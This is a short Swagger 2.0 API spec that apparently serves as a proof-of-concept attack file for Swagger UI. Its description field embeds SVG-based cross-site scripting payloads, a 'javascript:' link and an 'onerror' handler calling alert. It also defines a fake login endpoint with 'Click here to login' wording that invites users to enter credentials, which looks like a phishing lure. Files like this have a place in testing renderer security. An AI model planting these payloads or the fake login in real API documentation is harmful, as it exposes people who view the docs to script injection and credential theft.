swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: 'SVG link: <svg width="200" height="60"><a xlink:href="javascript:alert(document.domain)"><text x="10" y="30" fill="blue">Click here</text></a></svg> <svg><image href="x" onerror="alert(1)"/></svg>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
